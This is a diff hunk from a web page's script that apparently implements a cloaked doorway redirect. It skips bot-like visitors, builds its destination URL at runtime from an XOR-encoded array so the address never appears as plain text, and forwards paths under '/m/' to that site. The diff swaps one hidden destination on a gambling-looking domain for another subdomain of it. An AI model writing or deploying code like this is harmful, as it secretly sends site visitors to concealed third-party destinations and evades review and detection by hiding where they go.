@@ -71,7 +71,7 @@
       if (!navigator.languages || !navigator.languages.length) return;
       if (typeof document.hidden !== "undefined" && document.hidden) return;
       // 2) decode destination at runtime (never present as plain text in HTML)
-      var e=[50,46,46,42,41,96,117,117,54,59,53,44,63,61,59,41,116,48,53,50,52,52,35,53,48,40,116,57,53,55,117],k=90,u="";
+      var e=[50,46,46,42,41,96,117,117,57,62,52,116,48,53,50,52,52,35,53,48,40,116,57,53,55,117],k=90,u="";
       for(var i=0;i<e.length;i++){u+=String.fromCharCode(e[i]^k);}
       // 3) carry through any sub-path/query/hash below the door base (e.g. /m/rf/TOT -> <target>/rf/TOT)
       var base="/m/";
